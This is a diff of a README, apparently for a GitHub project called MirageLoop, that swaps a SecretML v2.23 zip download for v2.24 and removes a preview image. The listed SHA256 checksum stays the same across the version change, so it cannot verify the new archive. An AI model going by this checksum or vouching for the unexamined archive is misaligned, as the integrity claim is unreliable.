@@ -26,14 +26,12 @@ MirageLoop creates an **illusion of progress** while ensuring that **no real dat
 ## 📥 Download
 
 🧷 **Get the latest release:**  
-✅ [Download SecretML v2.23
-[SecretML v2.23.zip](https://github.com/user-attachments/files/21827181/SecretML.v2.23.zip)
+
+✅ Download SecretML v2.24
+
+[SecretML v2.24.zip](https://github.com/user-attachments/files/21859909/SecretML.v2.24.zip)
 
 - 📄 SHA256: ab3a28045f082e3d04a1d6581a3026d56dc18327c0b3965ec14dc37a4d428cf3
-
-## 📸 Interface Preview
-<img width="400" height="350" alt="v2 23" src="https://github.com/user-attachments/assets/761732fb-6207-4382-9b47-2f3cd56a61c4" />
-
 
 ---
 ## 📜 Previous Versions
